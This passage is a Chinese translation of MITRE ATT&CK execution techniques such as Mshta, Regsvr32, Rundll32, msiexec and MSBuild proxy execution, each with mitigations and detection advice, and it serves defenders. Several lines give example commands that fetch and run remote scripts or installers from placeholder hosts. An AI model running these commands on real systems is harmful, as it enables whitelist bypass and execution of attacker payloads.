检测软件漏洞利用可能比较困难，具体取决于可用的工具。 还要在终端系统上查找可能标志成功攻击的行为，例如浏览器或 Office 进程的异常行为。这可能包括写入磁盘的可疑文件、有关尝试隐藏执行的 [**进程注入**](#process-injection-%e8%bf%9b%e7%a8%8b%e6%b3%a8%e5%85%a5) 的证据、有关披露技术 **(Discovery)** 的证据，或者其他异常网络流量，可能表明额外的工具被引入系统。

***

### Graphical User Interface (GUI)

>[原文链接](https://attack.mitre.org/techniques/T1061/)

**GUI** 是与操作系统进行交互的常用方式。攻击者可以再操作过程中使用图形化界面，通常通过 **远程交互式协议** 使用系统的 **GUI**

#### 防御方式

这种方法主要由于对 **系统功能的滥用**，而不是防御方式所能解决的。

#### 检测手段

通过 **GUI** 检测执行可能会导致严重的误报。应考虑其他因素来检测可能导致攻击者通过交互式远程会话获得对系统的访问的服务滥用。

通过远程交互式会话发生的特定系统上正常行为之外的未知或异常进程启动是可疑的。收集和审核安全日志，这些日志可能显示访问和使用合法凭证来访问网络的远程系统。

***

### InstallUtil (InstallUtil)

>[原文链接](https://attack.mitre.org/techniques/T1118/)

**InstallUtil** 是一个命令行应用程序，它允许通过执行 **.NET** 二进制文件中指定的特定安全程序组件来安装和卸载资源。 **InstallUtil** 位于 **Windows** 系统上的 **.NET** 目录中：`C:\Windows\Microsoft.NET\Framework\v\InstallUtil.exe` 和 `C:\Windows\Microsoft.NET\Framework64\v\InstallUtil.exe`。 `InstallUtil.exe`具有 **Microsoft** 的数字签名。 攻击者可以通过受信的 Windows 应用程序使用 InstallUtil 来代理代码的执行。 通过利用执行由 `System.ComponentModel.RunInstaller(true)` 修饰的类的二进制文件中的属性，**InstallUtil** 还可以绕过进程白名单。

#### 防御方式

防御方式|描述
:--:|:--
**功能禁用**|在给定的环境中，可能不需要 **InstallUtil**
**预防执行**|如果给定系统或网络不需要安装应用程序白名单，则该应用程序白名单可阻止 `InstallUtil.exe` 的执行

#### 检测手段

使用进程监视来监视 `InstallUtil.exe` 的执行和参数。 将 `InstallUtil.exe` 最近的调用与之前的已知良好参数调用和已执行的二进制文件进行比较，以确定异常和潜在的攻击活动。 `InstallUtil.exe` 调用前后使用的命令参数也可能有助于确定执行的二进制文件的来源和目的。

***

### Launchctl (macOS)

>[原文链接](https://attack.mitre.org/techniques/T1152/)

**Launchctl** 控制 **macOS** 的启动进程，该进程处理诸如启动代理和启动守护进程之类的事情，但是可以自己执行其他命令或程序。 **Launchctl** 支持交互地在命令行上获取子命令，甚至可以从标准输入重定向。 通过加载或重新加载启动代理或启动守护进程，攻击者可以 **持久化** 或执行他们 所做的更改。 从 launchctl 运行命令很简单，就像 `launchctl submit -l -- /Path/to/thing/to/execute "arg" "arg" "arg"`。加载，卸载和重新加载启动代理或守护进程。如果系统允许 **launchctl**，攻击者可以滥用此功能执行代码甚至绕过白名单。

#### 防御方式

防御方式|描述
:--:|:--
用户帐号管理|阻止用户安装自己的启动代理或启动守护进程，要求它们由组策略推出

#### 检测手段

[Knock Knock](https://www.isofts.org/mac-knockknock/) 可用于检测持久化程序。例如通过 **launchctl** 安装的启动代理程序或启动守护程序。 此外，每个启动代理或启动守护进程必须在磁盘上的某个位置户有可以监视的相应 **plist** 文件。 监控 **launchctl/launchd** 的进程执行，以查找异常或未知进程。

***

### Local Job Scheduling (本地作业调度)

>[原文链接](https://attack.mitre.org/techniques/T1168/)

在 **Linux** 和 **macOS** 系统上，支持多种方法可以创建预定和定期的后台作业：**cron** 、 **at** 和 **launchd**。与 Windows 系统上的 **调度任务** 不同，基于 linux 的系统上的作业调度不能远程完成，除非与已建立的远程会话 (如 secure shell (SSH))结合使用。

#### cron

通过修改 `/etc/crontab`， `/etc/cron.d/` 目录或 **Cron** 守护进程支持的其他位置可以安装系统级的 **cron** 作业。而每个用户的 **cron** 作业是通过 **crontab** 使用具有特定格式的 **crontab** 文件安装的。­它在 **macOS** 和 **Linux** 系统上都有效。

这些方法允许在没有用户交互的情况下在后台以特定的周期间隔执行命令或脚本。攻击者可以利用作业调度在系统启动时执行程序或为了持久性而在预定的基础上执行程序， 作为横向移动的一部分执行，获取 root 权限，或者在特定帐户的上下文中运行进程。

#### at

**at** 是基于 **POSIX** 的系统 (包括 **macOS** 和 **Linux** ) 用于将程序或脚本作业安排在之后的日期和/或时间执行的另一种方式，也可以用于相同的目的。

#### launchd

每个 **launchd** 作业由不同的配置属性列表 **(plist)** 文件描述，该文件类似于启动守护进程 **(Launch Daemon)** 或启动代理 **(Launch Agent)**，不过它包括名为 `StartCalendarInterval` 的附加键，该键包含一个时间值的字典。这只适用于 **macOS** 和 **OS X**。

#### 防御方式

防御方式|描述
:--:|:--
**用户帐号管理**|限制用户帐户的权限并修复提权向量，只有授权用户才能创建计划作业
**预防执行**|使用白名单工具识别并拦截可用于调度作业的不必要的系统实用程序或潜在恶意软件

#### 检测手段

在安装新软件期间或通过管理功能可以创建合法的计划作业。 可以从各自的实用程序监视使用 **launchd** 和 **cron** 调度的作业，以列出关于这些作业的详细信息。 监视 **launchd** 和 **cron** 任务导致的进程执行，以查找异常或未知的应用程序和行为。

***

### LSASS Driver (LSASS驱动程序)

>[原文链接](https://attack.mitre.org/techniques/T1177/)

Windows 安全子系统是管理和执行计算机或域的安全策略的组件集。本地安全权威 **(Local Security Authority, LSA)** 是负责本地安全策略和用户身份验证的主要组件。 LSA 包括与各种其他安全功能相关联的多个动态链接库 **(DLL)**，所有这些功能都在 LSA 子系统服务 (LSASS) `lsass.exe` 上下文中运行。

攻击者可能利用 `lsass.exe` 来获取 **执行 和/或 持久化**。通过替换或添加非法应用 (如，[**DLL旁路加载**](#dll-side-loading-dll%e6%97%81%e8%b7%af%e5%8a%a0%e8%bd%bd-windows) 或 [**DLL搜索劫持**](#dll-search-order-hijacking-dll%e6%90%9c%e7%b4%a2%e9%a1%ba%e5%ba%8f%e5%8a%ab%e6%8c%81))，攻击者可以实现由连续 LSA 操作触发的任意代码执行。

#### 防御方式

防御方式|描述
:--:|:--
**代码签名**|在 Windows 8.1 和 Server 2012 R2 上，通过设置注册表键`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL` 为 `dword:00000001` 来启用 LSA 保护。**LSA** 保护确保仅加载具有**Microsoft 签名** 并遵循 **Microsoft SDL** 的 **LSA插件** 和 **驱动程序**
**凭证访问**|在 Windows 10 和 Server 2016 上，启用 **Windows Defender Credential Guard** 以在没有任何设备驱动程序的隔离虚拟化环境中运行 `lsass.exe`
**限制库加载**|确保启用安全 DLL 搜索模式`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode` 以降低 `lsass.exe` 加载恶意代码库的风险

#### 检测手段

- 启用 LSA 保护后，监视事件日志 **(Events 3033 和 3063)**，以查找加载 LSA 插件和驱动程序的失败尝试
- 利用 **Sysinternals Autoruns/Autorunsc** 实用程序 检查与 LSA 相关的加载驱动程序
- 使用 **Sysinternals Process Monitor** 实用程序监视 `lsass.exe` 中的 DLL 加载操作

***

### Mshta (Mshta.exe)

>[原文链接](https://attack.mitre.org/techniques/T1170/)

`Mshta.exe` 是执行 **Microsoft HTML 应用程序 (HTA)** 的应用程序。**HTA** 文件的扩展名是 **.hta** 。**HTAs** 是独立的应用程序，使用与 Internet Explorer 的相同模型和技术执行，但又不属于浏览器。

攻击者可以使用 `mshta.exe` 通过受信任的 Windows 实用程序代理执行恶意 **.hta** 文件和 Javascript 或 VBScript。

文件可以由 `mshta.exe` 通过内联脚本执行：`mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))`

也可以通过 **URL** 执行：`mshta http[:]//webserver/payload[.]hta`

`Mshta.exe` 可用于绕过允许其运行的应用程序白名单。`mshta.exe` 也在 Internet Explorer 的安全上下文外执行，因此也绕过浏览器的安全设置。

#### 防御方式

防御方式|描述
:--:|:--
**禁用功能**|`Mshta.exe` 在给定的环境中可能不是必需的，因为与他功能相关联的 **旧版IE浏览器** 已经过时了
**预防执行**|如果给定的系统或网络不需要 `mshta.exe`，配置应用程序白名单来拦截 `mshta.exe` 执行

#### 检测手段

- 使用进程监视来监视 `mshta.exe` 的执行和参数。 在命令行中查找 `mshta.exe` 执行原始或混淆的脚本。 将 `mshta.exe` 的最近调用与之前的已知良好参数调用和已执行的二进制文件进行比较，以确定异常和潜在的攻击活动
- `mshta.exe` 调用前后使用的命令参数也可能有助于确定执行的二进制文件的来源和目的
- 监控 **HTA** 文件的使用。 如果它们不在通常的环境中运行，那么它们的执行可能是可疑的

***

### PowerShell (PowerShell)

>[原文链接](https://attack.mitre.org/techniques/T1086/)

**PowerShell** 是 Windows 里一个强大的 **交互式命令行界面和脚本环境**。攻击者可以通过 **PowerShell** 进行很多操作，包括窃取信息和代码执行。

**PowerShell** 也可以用于从Internet下载并运行可执行文件，这些可执行文件可以从磁盘或内存中执行而无需接触磁盘。

**PowerShell命令/脚本** 无需通过 `powershell.exe` 二进制文件直接调用，由 **.NET 框架 和 Windows公共语言接口 (CLI)** 公开的 **PowerShell** 底层 `System.Management.Automation` 程序集提供了调用接口。

#### 防御方式

防御方式|描述
:--:|:--
**代码签名**|将 **PowerShell** 执行策略设置为仅执行签名的脚本
**功能禁用**|在不需要的时可以从系统中删除 PowerShell，但是应该进行审查以评估对环境的影响，因为它可以用于许多合法目的和管理功能。禁用/限制 **WinRM** 服务，以帮助防止将 **PowerShell** 用于远程执行
**账户权限管理**| 当需要使用 **PowerShell** 时，将 **PowerShell** 执行策略限制为管理员，请注意存在可以绕过 **PowerShell** 执行策略的方法，具体取决于环境配置

#### 检测手段

- 在设置了适当的执行策略的情况下，如果攻击者通过注册表或命令行获得管理员或系统访问权限，那么他们可能能够定义自己的执行策略。这种系统策略的更改可能是检测 **PowerShell** 恶意使用的一种方法。 如果环境中未使用 **PowerShell** ，则只需查找 **PowerShell** 执行即可检测恶意活动。

- 监视与 **PowerShell** 的程序集密切相关的特定组件的 **加载 和/或 执行** (例如 `System.Management.Automation.dll`) (尤其是对于异常的进程**名称/位置**)

- 启用 **PowerShell** 日志记录还有助于提高执行过程中的准确度。PowerShell 5.0 引入了增强的日志记录功能，其中一些功能已添加到 PowerShell 4.0 中。 早期版本的 PowerShell 日志记录功能并不多。 组织可以在数据分析平台中收集 PowerShell 的执行细节，作为 PowerShell 日志的补充。

***

### Regsvcs/Regasm (Regsvcs / Regasm)

>[原文链接](https://attack.mitre.org/techniques/T1121/)

**Regsvcs / Regasm** 是Windows命令行，用于注册 **.NET 组件对象模型 (COM) 程序集**。 两者均由 Microsoft 进行数字签名的。

攻击者可以使用 **Regsvcs 和 Regasm** 通过受信任的 Windows 实用程序代理代码的执行。这两个实用程序都可以通过使用二进制文件中的属性来指定在 **注册或注销** 前应运行的代码，从而绕过白名单： 分别为 `[ComRegisterFunction]` 或 `[ComUnregisterFunction]`。即使进程因特权不足而无法执行，具有 **注册和注销** 属性的代码也会执行

#### 防御方式

防御方式|描述
:--:|:--
**功能禁用**|在给定的环境中，**Regsvcs 和 Regasm** 可能不是必需的
**预防执行**|如果一个给定的系统或网络不需要 `Regsvc.exe` 和 `Regasm.exe`， 拦截它们的执行以避免攻击者潜在的滥用

#### 检测手段

使用进程监视来监视 `Regsvcs.exe` 和 `Regasm.exe` 的执行和参数。 将 `Regsvcs.exe` 和 `Regasm.exe` 的最近调用与之前已知良好参数的调用和已执行的二进制文件进行比较，以确定异常和潜在的攻击活动。 在 `Regsvcs.exe` 或 `Regasm.exe` 前后使用的命令参数也可能有助于确定执行的二进制文件的来源和目的。

***

### Regsvr32 (Regsvr32)

>[原文链接](https://attack.mitre.org/techniques/T1117/)

`regsvr32.exe`是一个命令行程序，用于在Windows系统上注册和注销 **对象连接和嵌入式控件** ，包括动态链接库 **(DLLs)** 。`regsvr32.exe` 可用于执行任意二进制文件。

攻击者可以利用该功能来代理代码的执行，来规避安全工具，`regsvr32.exe` 可能由于白名单抑或是正常操作时的误报，导致工具可能无法监视`regsvr32.exe` 进程的执行或是由 `regsvr32.exe` 加载的模块。`regsvr32.exe` 同样具有 **Microsoft 签名** 。

`regsvr32.exe` 还可以利用在用户权限下执行加载 **COM scriptlet** DLL 的功能来绕过进程白名单。由于 `regsvr32.exe` 支持网络和代理，可以通过传递 **URL** 到远程服务器来加载脚本。这种方法没对注册表做任何的修改，究其原因，**COM** 对象仅执行而未注册。该技术的变体通常称为 **Squiblydoo** 攻击。

通过 [**COM 劫持**](#component-object-model-hijacking-com%e5%8a%ab%e6%8c%81)，`regsvr32.exe`还可以注册一个 **COM 对象**，来达到 **持久化**

#### 防御方式

防御方式|描述
:--:|:--
**Exp防护**|**Microsoft's Enhanced Mitigation Experience Toolkit (EMET)** 的 **攻击面减小 (ASR)** 功能可以用来阻止 `regsvr32.exe` 绕过白名单

#### 检测手段

使用进程监控来监控 `regsvr32.exe` 的执行和参数。 将 `regsvr32.exe` 最近的调用与之前的已知良好参数和被加载的文件进行比较，以确定异常和潜在的攻击活动。 `regsvr32.exe` 调用前后使用的命令参数也可能有助于确定执行的二进制文件的来源和目的。

***

### Rundll32 (Rundll32)

>[原文链接](https://attack.mitre.org/techniques/T1085/)

可以调用 `rundll32.exe` 来执行任意二进制文件。由于白名单或Windows使用`rundll32.exe` 进行正常操作而产生的误报，攻击者可能会利用此功能来代理代码执行以避免安全工具监视 `rundll32.exe` 进程的执行。

`rundll32.exe` 可通过未披露的 `shell32.dll` 的函数 `Control_RunDLL` 和 `Control_RunDLLAsUser` 来执行 **控制面板项文件 (.cpl)** 。双击 **.cpl 文件** 也可以执行 `rundll32.exe` 。 `rundll32.exe` 可用于执行 **Javascript** 等脚本。这可以使用类似的语法：`rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"`

#### 防御方式

防御方式|描述
:--:|:--
**Exp防护**|**Microsoft's Enhanced Mitigation Experience Toolkit (EMET)** 的 **攻击面减小 (ASR)** 功能可以用来阻止 `rundll32.exe` 绕过白名单

#### 检测手段

使用进程监控来监控 `rundll32.exe` 的执行和参数。 将 `rundll32.exe` 最近调用与之前的已知良好参数和被加载的 dll 进行比较，以确定异常和潜在的攻击活动。 `rundll32.exe` 调用中使用的命令参数也可能有助于确定加载 DLL 的来源和目的。

***

### Scheduled Task (计划任务)

>[原文链接](https://attack.mitre.org/techniques/T1053/)

诸如 **at** 和 **schtasks** 之类的实用程序以及Windows任务计划程序可以安排在指定日期和时间执行的程序或者脚本。只要身份验证正确以使用 **RPC** ，并且开启了文件和打印机共享，便可以在远程系统上计划任务。在远程系统上计划任务通常需要是 **Administrators 组成员** 。

攻击者可以使用计划任务，在系统启动时，或在计划的基础上执行程序以实现持久化，作为 **横向移动** 的一部分执行远程任务，获得 **SYSTEM** 权限，或者在指定帐户的上下文下运行进程。

#### 防御方式

防御方式|描述
:--:|:--
**审计**|像 **PowerSploit** 框架之类的工具包具有 **PowerUp** 模块，可以使用该模块研究计划任务中可用于提权的权限缺陷
**系统配置**|配置计划任务的设置，以强制任务在经过身份验证的帐户的上下文中运行，而不是允许它们以 **SYSTEM** 身份运行。关联的注册表项位于 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\SubmitControl` 。可以通过 **GPO** 配置该设置：**计算机配置> [策略]> Windows设置 >安全设置 > 本地策略 >安全选项：域控制器：允许服务器操作员计划任务，设置为禁用**
**账户权限管理**|配置 **Increase Scheduling Priority** 选项，仅允许管理员组安排优先级进程的权限。 这可以通过 **GPO** 配置： **计算机配置>[策略]> Windows 设置 > 安全设置 > 本地策略 > 用户权限分配： 增加计划优先级**
**用户账号管理**|限制用户帐户的权限并修复提权向量，只有授权管理员才能在远程系统上创建计划任务

#### 检测手段

监控常见实用程序通过命令行调用创建的计划任务。 在安装新软件期间或通过系统管理功能可以创建合法的计划任务。 监控 **Windows 10** 中 `svchost.exe` 和 **Windows** 旧版本中 **Windows 任务计划程序** `taskeng.exe` 的进程执行。 如果计划任务不是用于持久化，那么攻击者很可能在操作结束时删除任务。监视 `%systemroot%\System32\Tasks` 下的 Windows 任务计划程序，查看是否有与已知软件，补丁周期等无关的计划任务相关的更改条目。

通过启用事件日志记录服务中的 `Microsoft-Windows-TaskScheduler / Operational` 设置，为计划的任务创建和更改配置事件日志记录。然后，将在计划的任务活动中记录几个事件，包括：

- Windows 7，Server 2008 R2上的事件ID 106-已注册计划任务
- Windows 7，Server 2008 R2 / 4702在Windows 7，Windows 10，Server 2016上的事件ID 140-计划任务已更新
- Windows 7，Server 2008 R2上的事件ID 141，Windows 10 Server 2016上的4699-计划任务已删除
- Windows 10，Server 2016上的事件ID 4698-已创建计划任务
- Windows 10，Server 2016上的事件ID 4700-已启用计划任务
- Windows 10，Server 2016上的事件ID 4701-已禁用计划任务

诸如 **Sysinternals Autoruns** 等工具也可用于检测可能尝试持久化的系统更改，包括列出当前计划任务。 查找与已知软件、补丁周期等无关的任务更改。当与历史数据进行比对，通过计划任务执行的可疑程序可能会显示为未见过的异常进程。

监视可以创建任务的进程和命令行参数的操作。具有内置功能的远程访问工具可以直接与 **Windows API** 交互，以在典型的系统实用程序外执行这些功能。 还可以通过 Windows 系统管理工具 (如 [**Windows 管理规范**](#windows-management-instrumentation-windows-%e7%ae%a1%e7%90%86%e8%a7%84%e8%8c%83) 和 [**PowerShell**](#powershell-powershell) ) 创建任务，因此可能需要配置额外的日志以收集适当的数据。

***

### Scripting (脚本)

>[原文链接](https://attack.mitre.org/techniques/T1064/)

攻击者可以使用脚本来帮助执行一些本需手动的操作。脚本可以加速操作任务，减少访问关键资源的时间。一些脚本语言可以通过 **API** 直接与操作系统交互而不是调用其他程序，可以绕过进程监控。Windows的常用脚本语言包括 **VBScript** 和 [**PowerShell**](#powershell-powershell)，也可以采用 **命令行批处理文本** 。

脚本可以作为 **宏** 嵌入到 **Office** 文档，再打开 [鱼叉式钓鱼附件](#spearphishing-attachment-%e9%b1%bc%e5%8f%89%e5%bc%8f%e9%92%93%e9%b1%bc%e9%99%84%e4%bb%b6) 等 **钓鱼手段** 时执行这些 **宏** 。恶意嵌入式 **宏** 是一种替代的执行方式，而不是 [**通过客户端执行的利用**](#execution-for-client-execution-%e5%ae%a2%e6%88%b7%e7%ab%af%e6%89%a7%e8%a1%8c%e7%9a%84%e5%88%a9%e7%94%a8) ，在客户端执行中，攻击者依赖于被允许的 **宏** 或用户接受并激活的 **宏**。

#### 防御方法

防御方式|描述
:--:|:--
**应用隔离与沙箱机制**|配置 **Office 安全设置**以启用 **受保护视图**，在沙箱环境中执行，并通过组策略拦截宏。其他类型的虚拟化和应用程序微分段也可以减轻攻击的影响。实施中可能还存在其他漏利用和缺陷的风险
**功能禁用**|关闭未使用的功能或限制对脚本引擎 **(如 VBScript)** 或可编写脚本的管理框架 **(如 PowerShell)** 的访问

#### 检测手段

脚本可能在管理员，开发人员或高级用户系统上很常见，具体取决于工作功能。如果脚本对于普通用户来说是受限的，那么在系统上任何尝试运行脚本的行为都将视为可疑。如果脚本在系统上不常用但已启用，则从补丁周期或其他管理员功能中运行的脚本是可疑的。­应尽可能从文件系统中捕获脚本以确定其操作和意图。

在系统上，脚本执行的各种操作都可能产生事件，具体取决于其使用的监控类型。监视脚本执行和后续行为的进程和命令行参数。它的行为可能与网络和系统信息泄露、收集或其他可编写脚本的后渗透攻击行为有关，并且可以用作返回源脚本的检测指示符。

分析 **Office** 文件附件中的潜在恶意宏。宏的执行可能会创建可疑的进程树，具体取决于宏的设计用途。

***

### Service Execution (服务执行)

>[原文链接](https://attack.mitre.org/techniques/T1035/)

攻击者可以通过与Windows服务 **(如 服务控制管理器)** 交互来执行二进制文件，命令或者脚本。这可以通过创建写服务或修改现有服务来完成。这个技术通常是在 [**持久化**](#persistence-%e6%8c%81%e4%b9%85%e5%8c%96) 或 [**提权**](#privilege-escalation-%e6%8f%90%e6%9d%83) 与 **创建新服务** 与 **修改现有服务** 结合使用。

#### 防御方法

防御方式|描述
:--:|:--
**账户权限管理**|确保权限规则不允许具有较低权限级别的用户创建或与较高权限级别运行交互
**限制目录和文件权限**|还要确保具有较低权限级别的用户无法替换或修改高权限级别服务二进制文件

#### 检测手段

对服务注册表项的更改以及能够修改与已知软件、补丁周期等不相关的服务的工具的命令行调用可能是可疑的。如果服务仅用于执行二进制文件或脚本但不是持久化，在服务重启后，他就会回到初始态，这样服务就不会像常见的管理员工具 **PsExec** 一样被破坏。

***

### Signed Binary Proxy Execution (含签名的二进制代理执行)

>[原文链接](https://attack.mitre.org/techniques/T1218/)

具有可信数字证书签名的二进制文件可以在受数字签名验证保护的 Windows 系统上执行。 Windows 安装中默认的几个 Microsoft 签名二进制文件可以用于代理其他文件的执行。 攻击者可能会滥用此行为来执行恶意文件，从而绕过系统上的应用程序白名单和签名验证。 该技术考虑了在现有技术中尚未考虑的代理执行方法。

#### `msiexec.exe`

`msiexec.exe` 是命令行的Windows实用程序，是 **Windows Installer** 的一部分。攻击者可以使用 `msiexec.exe` 来加载恶意 **MSI** 文件来进行代码执行。攻击者可以使用它来加载本地或者网络中的 **MSI** 文件。`msiexec.exe` 也可以用于执行 DLL 。

- `msiexec.exe /q /i "C:\path\to\file.msi"`
- `msiexec.exe /q /i http[:]//site[.]com/file.msi`
- `msiexec.exe /y "C:\path\to\file.dll"`

#### `Mavinject.exe`

Mavinject.exe 是一个允许代码执行的 Windows 实用程序。 可以使用 Mavinject 将 DLL 注入到正在运行的进程中。

- `"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" <PID> /INJECTRUNNING <PATH DLL>`
- `C:\Windows\system32\mavinject.exe <PID> /INJECTRUNNING <PATH DLL>`

#### `SyncAppvPublishingServer.exe`

SyncAppvPublishingServer.exe 可以在不执行 powershell.exe 的情况下运行 powershell 脚本。使用 `REGSVR` 选项去执行 DLL 可以使该应用程序达到与 [**Regsvr32**](#regsvr32-regsvr32) 同样的效果。

#### `odbcconf.exe`

`odbcconf.exe` 是 Windows实用应用程序，可以允许您配置 **ODBC** 驱动和数据资源名称。

- `odbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"}`

#### 防御方法

防御方式|描述
:--:|:--
**预防执行**|在给定的环境中，可能并不需要某些可用于执行其他程序的签名二进制文件。 如果给定的系统或网络不需要这些脚本，配置应用程序白名单来阻止它们的执行
**账户权限管理**|如果需要使用这些二进制文件，则将它们的执行限制在需要使用它们的特权帐户或组中，以减少恶意使用的可能

#### 检测手段

监视可能用于代理恶意文件执行的签名二进制文件的进程和命令行参数。 将活动与其他可疑行为关联起来，以减少由于用户和管理员的正常良性使用而产生的误报。

***

### Signed Script Proxy Execution (含签名的脚本代理执行)

>[原文链接](https://attack.mitre.org/techniques/T1216/)

使用受信证书签名的脚本可用于代理恶意文件的执行。此行为可以绕过签名验证和不考虑使用这些脚本的应用程序白名单。

`PubPrn.vbs` 由Microsoft签名，可用于代理远程站点的执行。示例命令: `cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png`

#### 防御方式

防御方式|描述
:--:|:--
**预防执行**|在给定的环境中，可能并不需要某些可用于执行其他程序的签名脚本。 如果给定的系统或网络不需要这些脚本，配置应用程序白名单来阻止它们的执行

#### 检测手段

监视脚本进程 (如 **cscript**) 和命令行参数，查看是否有可用于代理执行恶意文件的脚本 (如 `PubPrn.vbs`)。

***

### Source (Source命令)

>[原文链接](https://attack.mitre.org/techniques/T1153/)

**Source 命令** 将函数加载到当前 **shell** 中，或者在当前 **上下文** 中执行。这个内置命令可以以两种不同的方式运行：`source /path/to/filename [arguments]` 或 `. /path/to/filename [arguments]`。注意 `.` 后面的空格。如果没有空格，将创建新 **shell** 来运行程序，而不是在当前上下文中运行程序。该命令通常用于使 **shell** 可以使用某些特性或函数，或者更新特定 **shell** 的环境。

攻击者可以滥用此功能来执行程序。使用该技术执行的文件不需要预先标记为可执行文件。

#### 防御方法

这种攻击技术无法通过预防性控制轻松缓解，因为他是系统功能的滥用。

#### 检测手段

监视由 source 命令执行而启动的源和后续进程的命令 shell 执行。 攻击者必须将文件放到磁盘中以便使用 source 执行，而这些文件可以通过文件监视检测到。

***

### Space after Filename (文件名后的空格)

>[原文链接](#space-after-filename-%e6%96%87%e4%bb%b6%e5%90%8d%e5%90%8e%e7%9a%84%e7%a9%ba%e6%a0%bc)

攻击者可以通过更改文件的扩展名来隐藏程序的真实文件类型。对于某些文件类型，在文件名末尾添加一个空格将改变操作系统处理该文件的方式。例如，如果有一个名为 **evil.bin** 的 **Mach-O** 可执行文件，当用户双击时，它会启动 **Terminal.app** 并执行。如果该文件被重命名为 **evil.txt** 。然后，当用户双击时，它将启动默认的文本编辑应用程序  (不执行二进制文件) 。但是，如果文件被重命名为 **evil.txt&nbsp;**  (注意文件名后的空格) 。然后当用户双击时，真正的文件类型取决于操作系统，文件会被恰当处理，同时对应的二进制文件将被执行。

攻击者可以利用这个特性欺骗用户双击任何格式的看起来友好的文件，并最终执行一些恶意的操作。

#### 防御方法

这种攻击手段属于对系统功能的滥用，无法针对性的防御。

#### 检测手段

空格通常位于文件名的末尾，因此可以通过文件监视轻松地进行检查。但是从用户的角度来看，很难在Finder.app或Terminal.app的命令行中注意到这一点。利用文件名中包含非标准扩展名的二进制文件执行的进程是可疑的。

***

### Third-party Software (第三方软件)

>[原文链接](https://attack.mitre.org/techniques/T1072/)

出于管理的目的，在网络环境中会部署第三方应用程序和软件 **(如，SCCM，VNC，HBSS，Altiris等)**。如果攻击者获得了对它们的访问权，便可以利用它们执行代码。

攻击者可以访问和使用安装在企业网络中的第三方系统，例如管理，监视和部署系统，以及用于管理其他系统的第三方网关和跳转服务器。访问第三方网络范围或企业范围的软件，攻击者可以链接到该系统上远程执行代码。这种访问也可以用于横向移动到以她系统，获取信息，或者产生意想不到的效果，比如清除所有终端上的硬盘。

此操作所需的权限因系统配置而异；直接访问部署服务器时，本地凭据可能就足够了，也可能需要特定的域凭据。但是，系统可能要求登录或执行软件部署需要管理员权限

#### 防御方法

防御方式|描述
:--:|:--
**Active Directory配置**|通过使用组策略，确保关键网络系统的正确系统和访问隔离
**多因素认证**|通过使用多因素身份验证，确保关键网络系统的正确系统和访问隔离
**网络隔离**|通过使用防火墙，确保关键网络系统的适当系统隔离
**密码策略**|验证可用于访问部署系统的帐户凭据是唯一的，并且不在整个企业网络中使用
**账户权限管理**|仅向有限的授权管理员授予对应用程序部署系统的访问权限
**远程数据存储**| 如果应用程序部署系统可以配置为仅部署已签名的二进制文件，请确保可信签名证书不与应用程序部署系统位于同一位置，而是位于无法远程访问或远程访问受到严格控制的系统上
**更新软件**|定期对部署系统打补丁，防止通过漏洞利用进行远程访问
**用户帐号管理**|确保第三方提供商用来访问这些系统的任何帐户都可追溯到第三方，并且不在整个网络中使用，也不在同一环境中被其他第三方提供商使用。确保对提供给这些系统的帐户进行定期审核，以验证持续的业务需求，并确保进行治理以跟踪不再需要的访问权限的取消。通过使用帐户特权分离来确保关键网络系统的正确系统和访问隔离
**用户培训**|对部署系统的使用有严格的批准策略

***

### Trap (trap 命令)

>[原文链接](https://attack.mitre.org/techniques/T1154/)

`trap` 命令使程序和 **shell** 可以指定接收中断信号时执行的命令。 一种常见的情况是脚本允许正常终止和处理常见的键盘中断，如 `ctrl+c` 和 `ctrl+d`。当 shell 遇到特定的中断时，攻击者可以使用它来注册要执行的代码，以获得执行或作为持久性机制。Trap 命令的格式如下：`trap 'command list' signals` 当接收到 `signals` 将执行 `command list` 。

#### 防御方式

由于 trap 命令的潜在合法使用，可能很难缓解这种技术的使用。

#### 检测手段

必须为 **shell** 或程序注册 **trap** 命令，因此它们出现在文件中。 监视文件是否存在可疑或过于宽泛的 **trap** 命令可以减少调查期间的可疑行为。 监视通过 **trap** 中断执行的可疑进程。

***

### Trusted Developer Utilities (受信任的开发工具)

>[原文链接](https://attack.mitre.org/techniques/T1127/)

有许多用于软件开发相关工作的实用程序可以用来以多种形式执行代码，以帮助开发、调试和逆向工程。 这些实用程序通常具有合法证书的签名，这些证书使它们可以在系统上执行，并通过可以有效地绕过应用程序白名单防御解决方案的可信进程来代理执行恶意代码。

#### MSBuild

`MSBuild.exe` (Microsoft Build Engine) 是 **Visual Studio** 使用的软件构建平台。 它使用 XML 格式的项目文件，这些文件定义了构建各种平台和配置的需求。

攻击者可以使用 **MSBuild** 通过受信的 Windows 实用程序代理代码的执行。 **.NET** 版本 4 中引入的 **MSBuild** 的内联任务功能允许将 **C#** 代码插入到 **XML** 项目文件中。 内联任务 **MSBuild** 将编译并执行内联任务。 `MSBuild.exe` 是由 **Microsoft** 签名的二进制文件，因此当以这种方式使用它时，可以执行任意代码并绕过配置为允许 `MSBuild.exe` 的应用程序白名单防御。

#### DNX

**.NET** 执行环境 (DNX)， `DNX.exe` 是随 **Visual Studio Enterprise** 打包的软件开发工具包。 它在 2016 年被淘汰，取而代之的是 **.NET Core CLI** 。 DNX 不存在于 Windows 的标准版本中，并且可能只存在于使用旧版。**NET Core** 和 **ASP.NET Core 1.0** 的开发人员工作站上。 可执行文件 `dnx.exe` 由 Microsoft 签名。 攻击者可以使用 `DNX. exe` 代理执行任意代码，绕过允许 DNX 执行的应用程序白名单。

#### RCSI

`Rcsi.exe` 实用程序是用于 **C#** 的非交互式命令行接口，类似于 `csi.exe` 。 **Roslyn.net** 编译器平台的早期版本提供 `Rcsi.exe`，但是在集成解决方案中弃用了。 `rcsi.exe` 由 Microsoft 签名。

在命令行上使用 `rcsi.exe` 编写和执行 **C# .csx** 脚本文件。 攻击者可以使用 `rcsi.exe` 来代理执行任意代码，从而绕过允许 `rcsi.exe` 执行的应用程序白名单策略。

#### WinDbg / CDB

